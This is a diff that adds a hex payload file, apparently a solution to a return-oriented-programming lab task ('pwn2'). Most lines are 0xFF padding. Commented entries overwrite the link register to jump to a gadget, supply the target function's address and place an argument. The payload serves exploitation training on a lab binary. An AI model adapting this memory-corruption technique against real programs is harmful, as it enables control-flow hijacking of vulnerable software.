@@ -1,0 +1,31 @@
+FF FF FF FF FF FF FF FF // this line writes garbage (same as task2)
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+80 9A 44 00 00 00 00 00 // rewrite LR to jump to gadget
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+8C 0A 40 00 00 00 00 00 // address of pwn2 for gadget to jump to
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+32 00 00 00 00 00 00 00 // put argument in right place for gadget
